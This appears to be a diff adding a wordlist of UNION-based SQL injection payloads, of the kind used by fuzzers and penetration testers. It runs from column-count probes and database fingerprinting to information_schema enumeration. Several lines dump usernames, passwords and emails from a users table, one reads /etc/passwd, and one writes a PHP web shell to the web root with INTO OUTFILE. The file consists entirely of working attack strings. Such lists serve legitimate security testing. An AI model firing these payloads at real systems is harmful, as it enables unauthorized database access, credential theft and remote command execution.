@@ -1,0 +1,85 @@
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT 1,2,3,4,5,6--
+' UNION SELECT 1,2,3,4,5,6,7--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT 1--
+' UNION ALL SELECT 1,2--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT 1,2,3,4--
+' UNION ALL SELECT 1,2,3,4,5--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT 1--
+1' UNION SELECT 1,2--
+1' UNION SELECT 1,2,3--
+' UNION SELECT @@version--
+' UNION SELECT @@version,NULL--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT @@hostname--
+' UNION SELECT @@datadir--
+' UNION SELECT @@basedir--
+' UNION SELECT user()--
+' UNION SELECT database()--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT 1,user()--
+' UNION SELECT 1,database()--
+' UNION SELECT 1,@@version--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT table_name,table_schema FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT column_name,table_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT username,password FROM users--
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT email,password FROM users--
+' UNION SELECT username,password,email FROM users--
+' UNION SELECT NULL,NULL,NULL WHERE 1=0 UNION SELECT 1,2,3--
+' UNION SELECT CHAR(116,101,115,116),NULL--
+' UNION SELECT 0x61646d696e,0x70617373776f7264--
+' UNION SELECT load_file('/etc/passwd'),NULL--
+' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+') UNION SELECT NULL--
+')) UNION SELECT NULL--
+') UNION SELECT 1--
+') UNION SELECT 1,2--
+') UNION SELECT 1,2,3--
+') UNION SELECT 1,2,3,4--
+') UNION SELECT 1,2,3,4,5--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT 1,2,3--
+" UNION SELECT @@version--
+" UNION SELECT user()--
+" UNION SELECT database()--
+-1 UNION SELECT NULL--
+-1 UNION SELECT NULL,NULL--
+-1 UNION SELECT NULL,NULL,NULL--
+-1 UNION SELECT 1--
+-1 UNION SELECT 1,2--
+-1 UNION SELECT 1,2,3--
+-1 UNION SELECT @@version--
+-1 UNION SELECT user()--
+-1 UNION SELECT database()--
+0 UNION SELECT NULL--
+0 UNION SELECT 1--
+0 UNION SELECT 1,2--
+999 UNION SELECT NULL--
+999 UNION SELECT 1--
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
